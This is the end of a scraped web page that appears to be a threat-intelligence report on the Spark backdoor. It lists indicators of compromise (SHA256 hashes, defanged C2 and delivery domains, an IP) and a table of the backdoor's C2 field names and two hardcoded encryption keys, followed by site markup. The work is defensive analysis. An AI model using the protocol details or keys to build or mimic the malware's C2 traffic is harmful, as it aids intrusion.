329e9e98f08f3d6a017254dd033984cfd6421ccab5b323ebace5d68662a98a09\r\n\r\n0631ed0995e21ec8f02f6167824eca92e84abfd8cf4dbbd9c7c88f88d4f570cd\r\n\r\nd010ef2b6664779b3c8cfa0a5179b7331d88d34d04350ebeeecb3bae65654393\r\n\r\n4889318807225e51bae4d9d9a536e5775eaf92685b289eef6839f9d89f8c4b85\r\n\r\n51042cac30b4d6072f79b3f9b27d8ee7b65f438549c90f57dc5fecc17d35054a\r\n\r\nec0d30d2fdd301bf0cfe66028c9a37d5535a8161909d0d3573447d1843f61c97\r\n\r\ne6e5593cbac23ec5c51e5f63c4c6616a8eb71697a89f9d1d17cc7be91c36e3e9\r\n\r\n36166db096ddb50af4f5c4be48b4274c535f40c74ce3450d4ad3bdaa2c28beb3\r\n\r\n966ad6452793b1562f0081456a951d3310d4e7690fa74ef8ff4046778bd37168\r\n\r\nb2437a54195d51435ad07867a5cb069e831fdd8e48bb70daa3894fde40754bc8\r\n\r\nfe19ab4fd65531163d197d565201c2afea7d9f8e74e5f75c714eb5fe086a02fd\r\n\r\n212aa6e3f236550bb4b9328071ee4f0e8a74465c75dcf1e6cde8502afde91364\r\n\r\ne489e5297ed8cf594c2a5160eff79b12b9ee68e36e0d00ed31f44b75c4a38f61\r\n\r\n0eebc31bb64ba0aa0ea335a5f35392ff1d058e97bf5cb5b46d7a89b197dcba7a\r\n\r\nfe0f23d6675260dd40f277906aa3dd34cbef2243336334dda10ad4500f8e6883\r\n\r\n7c5a9ce04002be953c556b5b50c10f8d462abc92d1ffe28a325d7ea741701be1\r\n\r\n45a2c50edd710476e0de8ece6cc5931035ce8183ac4cf521d494d94744d44c2c\r\n\r\nb84f2497e4cfeac240b1815b22741609e5a31f0be11667a3c7256c16788728ec\r\n\r\n78696cf4370817cb0ffd6930a92553d3551fe77cdc6d45638ddd13f05b9218b8\r\n\r\n5109f2c8f014698f1d2f0d59a7c9cc1cd9400a6fe4dcde95cc475f453e74bc6e\r\n\r\nab4e43b4e526d44bf12ae5113184afdf5c15630808f674f5e1a472eb6811ce3f\r\n\r\ndaa72ba2b9525d74e0a3564d0d72e06eed27d04ce63fe98c45b1e84cee09987c\r\n\r\n64ea1f1e0352f3d1099fdbb089e7b066d3460993717f7490c2e71eff6122c431\r\n\r\n6e60f5c65299ee7f7b257f5c83d3bb36154654b26e721136f7184514fcf6b296\r\n\r\nB08b8fddb9dd940a8ab91c9cb29db9bb611a5c533c9489fb99e36c43b4df1eca\r\n\r\ncf32479ed30ae959c4ec8a286bb039425d174062b26054c80572b4625646c551\r\n\r\n9511940ed52775aef969fba004678f4c142b33e2dd631a0e8f4e536ab0b811db\r\n\r\ne3779f6252ca606ace9ae06623ba086d1a441582b625e433799260d71cdb1b4b\r\n\r\ne6e9f7b0449976537d9276192e5767c9909cd34df028a8bf1cac3dbe490f0e73\r\n\r\n69df8e4bdc3fd69deb6c866254f80f6288549222ed0d07ccd4c05597e75414df\r\n\r\n40b7a1e8c00deb6d26f28bbdd3e9abe0a483873a4a530742bb65faace89ffd11\r\nRelated Delivery Domains\r\nservicebios[.]com\r\n\r\ndapoerwedding[.]com\r\n\r\nzmartco[.]com\r\nSpark C2 Domains\r\nwebtutorialz[.]com\r\n\r\nnysura[.]com\r\n\r\nlaceibagrafica[.]com\r\n\r\nmotoqu[.]com\r\n\r\nsmartweb9[.]com\r\n\r\nlaptower[.]com\r\n\r\napp.msexchanges16[.]com\r\n\r\nmsexchange13[.]com\r\n\r\ncloudserviceapi[.]online\r\n\r\nupdates.masterservices[.]online\r\n\r\nclients.itresolver[.]online\r\n\r\nupdate.itresolver[.]online\r\n\r\n91.219.237[.]99\r\n\r\ngoldenlines[.]site\r\n\r\nUpdate.nextdata[.]site\r\nSpark First Names and More\r\n\r\n\r\n\r\nDecrypted String\r\nUsage\r\nDescription\r\n\r\n\r\nLawrence\r\nC2 Channel (from payload)\r\nKey name in dictionary (JaseN) used to store the value of a task number provided in the Ivory field\r\n\r\n\r\nAllier\r\nC2 Channel (from C2)\r\nKey name used to store a number for an unknown purpose, but it is expected as a response to the MorganE communication type.\r\n\r\n\r\nJaseN\r\nC2 Channel (from payload)\r\nKey name for a list of dictionaries in the MorganE communication type, represents the received task numbers\r\n\r\n\r\nIvory\r\nC2 Channel (from C2)\r\nKey name in the Jordanlzw list used to store a number that we believe is a task number\r\n\r\n\r\nJonas\r\nC2 Channel (from C2)\r\nKey name in the Jordanlzw list used to store a boolean for an unknown reason\r\n\r\n\r\nReginacy\r\nC2 Channel (from C2)\r\nKey name in the Jordanlzw list used to store a boolean to not create the process, rather just send 'ok' back to C2\r\n\r\n\r\nTrumanRd\r\nC2 Channel (from C2)\r\nKey name in the Jordanlzw list used to store the command line arguments to run with an executable\r\n\r\n\r\nAlanih\r\nC2 Channel (from C2)\r\nKey name in the Jordanlzw list used to store the executable to to run\r\n\r\n\r\nAverizt\r\nC2 Channel (from payload)\r\nKey name that stores a number in the VanessaFM communication type that is hardcoded within the binary.\r\n\r\n\r\nMathiasNbo\r\nC2 Channel (from payload)\r\nKey name for a list of dictionaries in the VanessaFM communication type\r\n\r\n\r\nBrandentlK\r\nC2 Channel (from payload)\r\nKey name that stores a number in the VanessaFM communication type that is hardcoded into the configuration.\r\n\r\n\r\nAdalynngS\r\nC2 Channel (from payload)\r\nKey name in dictionary (MathiasNbo) used to store a number with unknown purpose.\r\n\r\n\r\nAdelineRD\r\nC2 Channel (from payload)\r\nKey name that stores a base64 encoded encrypted string obtained from the payload configuration sent to the C2 in the VanessaFM communication type. Considered as a nickname or campaign\/payload identifier.\r\n\r\n\r\nCollinsPM\r\nC2 Channel (from payload)\r\nKey name in dictionary (MathiasNbo) used to store the UUID also seen in the ZaydenlnL field\r\n\r\n\r\nNevaeh\r\nC2 Channel (from payload)\r\nKey name in dictionary (MathiasNbo) used to store a boolean with unknown purpose.\r\n\r\n\r\nLondonzO\r\nC2 Channel (from C2)\r\nKey name in the Jordanlzw list used to store a boolean to create a specified process and wait for return\r\n\r\n\r\nJoslynKe\r\nC2 Channel (from payload)\r\nValue in ReeceWNM field to represent the transmission of system information\r\n\r\n\r\nAngelxEv\r\nC2 Channel (from payload)\r\nKey name used in a system information dictionaries (Maximiliano) to store the information type value (1 = UUID, 2 = hostname, 3 = username)\r\n\r\n\r\nZaydenlnL\r\nC2 Channel (from payload)\r\nKey name used in a system information dictionaries (Maximiliano) to store the data associated with the type specified in AngelxEv\r\n\r\n\r\nHoustonod\r\nC2 Channel (from payload)\r\nKey name used in a system information dictionaries (Maximiliano) to store the value \"1\" whose purpose is unknown\r\n\r\n\r\nMaximiliano\r\nC2 Channel (from payload)\r\nKey name in JoslynKe communication type that stores a list of system information dictionaries\r\n\r\n\r\nGarrison\r\nC2 Channel (from C2)\r\nKey name for a number value used by the payload possibly as a sleep interval before sending results of additional commands.\r\n\r\n\r\nZeke\r\nC2 Channel (from payload)\r\nKey name for a list of dictionaries in the Winston communications type\r\n\r\n\r\nReesefP\r\nC2 Channel (from payload)\r\nKey name within a dictionary within the Zeke array used to represent the task number\r\n\r\n\r\nFrederickT\r\nC2 Channel (from payload)\r\nKey name within a dictionary within the Zeke array storing the results of the executed command for the task\r\n\r\n\r\nKaileeXws\r\nC2 Channel (from payload)\r\nKey name within a dictionary within the Zeke array storing the boolean if the execution was successful\r\n\r\n\r\nEverlyY\r\nC2 Channel (from C2)\r\nKey name for a number value used by the payload to idle for a specified number of seconds\r\n\r\n\r\nCallieVK\r\nC2 Channel (from payload)\r\nField in JSON sent to C2, used to store the communicated data\r\n\r\n\r\nReeceWNM\r\nC2 Channel (from payload)\r\nField in JSON sent to C2, used to store the communication type\r\n\r\n\r\nMorganE\r\nC2 Channel (from payload)\r\nValue in ReeceWNM field to represent the task number its about to send data regarding\r\n\r\n\r\nWinston\r\nC2 Channel (from payload)\r\nValue in ReeceWNM field to represent the transmission of command execution results\r\n\r\n\r\nJessicay\r\nC2 Channel (from payload)\r\nValue in ReeceWNM field to represent the beacon\r\n\r\n\r\nVanessaFM\r\nC2 Channel (from payload)\r\nValue in ReeceWNM field to represent the request for additional tasks\r\n\r\n\r\nrEA8GPZf4oIdOsjMxgFD\r\nKey\r\nUsed to encrypt fields within JSON sent to C2, including system information gathered\r\n\r\n\r\nJordanlzw\r\nC2 Channel (from C2)\r\nKey name of a list of dictionaries that store commands to run\r\n\r\n\r\nAryana\r\nC2 Channel (from C2)\r\nKey name for a number value used to specify the number of commands to run that are stored in the Jordanlzw list\r\n\r\n\r\n24\r\nConfig\r\nMinimum sleep interval between messages sent to C2\r\n\r\n\r\n119\r\nConfig\r\nMinimum sleep interval between failed C2 beacons\r\n\r\n\r\nJvFLb8pHNywoGdhtjsc5\r\nKey\r\nUsed to encrypt C2 communications\r\n\r\n\r\n\r\nSpark Nicknames\/Campaign Codes\r\n\r\n\r\n\r\nSHA256\r\nCompile Time\r\nNickname\r\n\r\n\r\n0631ed0995e21ec..\r\n2017-03-27 2:46:06\r\n28-10\r\n\r\n\r\n966ad6452793b15..\r\n2017-05-24 6:15:04\r\nNick name\r\n\r\n\r\n212aa6e3f236550..\r\n2017-05-24 6:15:04\r\nNick name\r\n\r\n\r\nab4e43b4e526d44..\r\n2017-05-24 6:15:04\r\nNick name\r\n\r\n\r\n36166db096ddb50..\r\n2017-10-07 7:06:22\r\nbbb\r\n\r\n\r\nd010ef2b6664779..\r\n2017-10-07 7:06:23\r\n28-10\r\n\r\n\r\n194c236a3eed81f..\r\n2017-10-22 7:03:45\r\nsss\r\n\r\n\r\nfc420a49b1e9e22..\r\n2017-10-22 7:03:45\r\nsss\r\n\r\n\r\nbc9353adc58b983..\r\n2017-10-22 7:03:45\r\nsss\r\n\r\n\r\n9d49020debdc6ab..\r\n2017-10-22 7:03:45\r\nNick name\r\n\r\n\r\n3a32c81ec609a54..\r\n2017-10-22 7:03:45\r\n3007\r\n\r\n\r\nc3e23a42dc49b03..\r\n2017-10-22 7:03:45\r\n50852\r\n\r\n\r\n8e5bf597948ea6a..\r\n2017-10-22 7:03:45\r\nO\r\n\r\n\r\n151303254451271..\r\n2017-10-22 7:03:45\r\nNick name\r\n\r\n\r\n83750372d4e8c04..\r\n2017-10-22 7:03:45\r\n0204\r\n\r\n\r\n58376e763ef0ca9..\r\n2017-10-22 7:03:45\r\nR\r\n\r\n\r\n1c43f8f68f7b8e4..\r\n2017-10-22 7:03:45\r\nood\r\n\r\n\r\nab2335ba3abe97a..\r\n2017-10-22 7:03:45\r\nNick name\r\n\r\n\r\na4c6aea61953d51..\r\n2017-10-22 7:03:45\r\nNick name\r\n\r\n\r\n329e9e98f08f3d6..\r\n2017-10-22 7:03:45\r\nFUD\r\n\r\n\r\n78696cf4370817c..\r\n2017-10-22 7:03:45\r\nBen\r\n\r\n\r\nec0d30d2fdd301b..\r\n2017-10-28 10:55:21\r\n28-10\r\n\r\n\r\n9511940ed52775a..\r\n2017-12-02 11:16:24\r\n&lt;blank&gt;\r\n\r\n\r\n5139a334d5629c5..\r\n2019-09-16 10:00:45\r\nbnvcs\r\n\r\n\r\n89acce7cdd354a0..\r\n2019-09-16 10:00:45\r\nDocx\r\n\r\n\r\nb654dd768912e09..\r\n2019-09-16 10:00:45\r\n2909\r\n\r\n\r\ndaa72ba2b9525d7..\r\n2019-09-16 10:00:45\r\nPalCamp\r\n\r\n\r\n69df8e4bdc3fd69..\r\n2019-09-16 10:00:45\r\nNewsMac\r\n\r\n\r\ncf32479ed30ae95..\r\n2019-12-30 9:45:44\r\n1401\r\n\r\n\r\n64ea1f1e0352f3d..\r\n2020-01-12 10:57:50\r\nFS1-2020\r\n\r\n\r\n6e60f5c65299ee7..\r\n2020-01-12 10:57:50\r\n1801\r\n\r\n\r\nb08b8fddb9dd940..\r\n2020-01-12 10:57:50\r\nFS1-2020\r\n\r\n\r\n04fa6aaea5e3a26..\r\n2020-01-12 10:57:50\r\nup\r\n\r\n\r\n\r\n&nbsp;","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/uploads\/2024\/06\/04_Business_email_compromise_Category_1920x900-300x300.jpg","width":300,"height":300},"speakable":{"@type":"SpeakableSpecification","xPath":["\/html\/head\/title","\/html\/head\/meta[@name='description']\/@content"]},"author":[{"@type":"Person","name":"Robert Falcone"},{"@type":"Person","name":"Bryan Lee"},{"@type":"Person","name":"Alex Hinchliffe"}]}</script><link rel='stylesheet' id='crayon-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' media='all' />
<link rel='stylesheet' id='crayon-theme-classic-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' media='all' />
<style id='co-authors-plus-coauthors-style-inline-css'>
.wp-block-co-authors-plus-coauthors.is-layout-flow [class*=wp-block-co-authors-plus]{display:inline}

</style>
<style id='co-authors-plus-avatar-style-inline-css'>
.wp-block-co-authors-plus-avatar :where(img){height:auto;max-width:100%;vertical-align:bottom}.wp-block-co-authors-plus-coauthors.is-layout-flow .wp-block-co-authors-plus-avatar :where(img){vertical-align:middle}.wp-block-co-authors-plus-avatar:is(.alignleft,.alignright){display:table}.wp-block-co-authors-plus-avatar.aligncenter{display:table;margin-inline:auto}

</style>
<style id='co-authors-plus-image-style-inline-css'>
.wp-block-co-authors-plus-image{margin-bottom:0}.wp-block-co-authors-plus-image :where(img){height:auto;max-width:100%;vertical-align:bottom}.wp-block-co-authors-plus-coauthors.is-layout-flow .wp-block-co-authors-plus-image :where(img){vertical-align:middle}.wp-block-co-authors-plus-image:is(.alignfull,.alignwide) :where(img){width:100%}.wp-block-co-authors-plus-image:is(.alignleft,.alignright){display:table}.wp-block-co-authors-plus-image.aligncenter{display:table;margin-inline:auto}

</style>
<style id='safe-svg-svg-icon-style-inline-css'>
.safe-svg-cover{text-align:center}.safe-svg-cover .safe-svg-inside{display:inline-block;max-width:100%}.safe-svg-cover svg{height:100%;max-height:100%;max-width:100%;width:100%}

</style>
<style id='classic-theme-styles-inline-css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='post-views-counter-frontend-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.min.css?ver=1.4.7' media='all' />
<link rel='stylesheet' id='wpml-legacy-post-translations-0-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-post-translations/style.min.css?ver=1' media='all' />
<link rel='stylesheet' id='unit42-v6-style-css' href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/style.css?ver=1.0.0' media='all' />
<link rel='stylesheet' id='unit42-v6-head-styles-css' href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/css/head-styles.css?ver=1.0.0' media='all' />
<link rel='stylesheet' id='unit42-v5-custom-styles-css' href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/css/main.css?ver=1.0.0' media='all' />
<link rel='stylesheet' id='unit42-v6-plugin-styles-css' href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/css/plugin.css?ver=1.0.0' media='all' />
<link rel='stylesheet' id='unit42-v6-custom-styles-css' href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/css/main-redesign.css?ver=1.0.0' media='all' />
<link rel='stylesheet' id='like-dislike-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/css/ldc-lite.css?ver=1.0.0' media='all' />
<script src="https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script src="https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<script id="crayon_js-js-extra">
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
</script>
<script src="https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta" id="crayon_js-js"></script>
<script id="post-views-counter-frontend-js-before">
var pvcArgsFrontend = {"mode":"js","postID":105134,"requestURL":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","nonce":"c3b9727a80","dataStorage":"cookies","multisite":false,"path":"\/","domain":""};
</script>
<script src="https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/js/frontend.min.js?ver=1.4.7" id="post-views-counter-frontend-js"></script>
<script id="wpml-xdomain-data-js-extra">
var wpml_xdomain_data = {"css_selector":"wpml-ls-item","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","current_lang":"en","_nonce":"d123c4ca65"};
</script>
<script src="https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/res/js/xdomain-data.js?ver=4.6.12" id="wpml-xdomain-data-js" defer data-wp-strategy="defer"></script>
<link rel="https://api.w.org/" href="https://unit42.paloaltonetworks.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://unit42.paloaltonetworks.com/wp-json/wp/v2/posts/105134" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://unit42.paloaltonetworks.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.6.1" />
<link rel='shortlink' href='https://unit42.paloaltonetworks.com/?p=105134' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fmolerats-delivers-spark-backdoor%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fmolerats-delivers-spark-backdoor%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.6.12 stt:1,28;" />
<meta name="google-site-verification" content="zHZtYOWm9hm4SZgsH7wqiYcOwmsAsxDUDU4UD1QxB40" /><style>#wpdevart_lb_overlay{background-color:#000000;} #wpdevart_lb_overlay.wpdevart_opacity{opacity:0.8 !important;} #wpdevart_lb_main_desc{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;} #wpdevart_lb_information_content{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;}
		#wpdevart_lb_information_content{
			width:100%;	
			padding-top:0px;
			padding-bottom:0px;
		}
		#wpdevart_info_counter_of_imgs{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_caption{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_title{
			    display: inline-block;
				padding-left:5px;
				padding-right:5px;
				font-size:15px;
				color:#000000;
		}
		@-webkit-keyframes rotate {
			to   {-webkit-transform: rotate(360deg);}
			from  {-webkit-transform: rotate(0deg);}
		}
		@keyframes rotate {
			to   {transform: rotate(360deg);}
			from  {transform: rotate(0deg);}
		}
		#wpdevart_lb_loading_img,#wpdevart_lb_loading_img_first{
			-webkit-animation: rotate 2s linear  infinite;
    		animation: rotate 2s linear infinite;
		}
	  </style>      <script src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6"></script>
<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3.0.1/es5/tex-mml-chtml.js"></script>
<link rel="icon" href="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-Unit42-180x180-1.png" sizes="32x32" />
<link rel="icon" href="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-Unit42-180x180-1.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-Unit42-180x180-1.png" />
